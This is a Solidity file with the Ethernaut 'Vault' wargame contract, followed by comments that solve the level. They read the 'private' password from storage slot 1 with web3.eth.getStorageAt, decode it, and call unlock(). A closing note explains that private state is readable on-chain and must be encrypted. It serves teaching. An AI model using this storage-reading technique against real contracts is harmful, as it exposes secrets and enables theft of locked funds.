// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}

// Need to attack the locked state variable and change it to false.
// How can I get the password?

// Turns out using private doesn't mean the varriable is inaccessible to the EVM
// It is simply inaccessible to other smart contracts

// We can use web3.getStorageAt to get the value of the password, if we know the storage slot
// web3.eth.getStorageAt("0xAFe83D26Dd816488c89bf8cf925D8156f272676A", 1, (err,res)=>{console.log(res)}); => 0x412076657279207374726f6e67207365637265742070617373776f7264203a29

// web3.utils.hexToAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29") => 'A very strong secret password :)'

// contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')

// contract.locked() => false

/*
It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.
*/

// https://medium.com/coinmonks/how-to-read-private-variables-in-contract-storage-with-truffle-ethernaut-lvl-8-walkthrough-b2382741da9f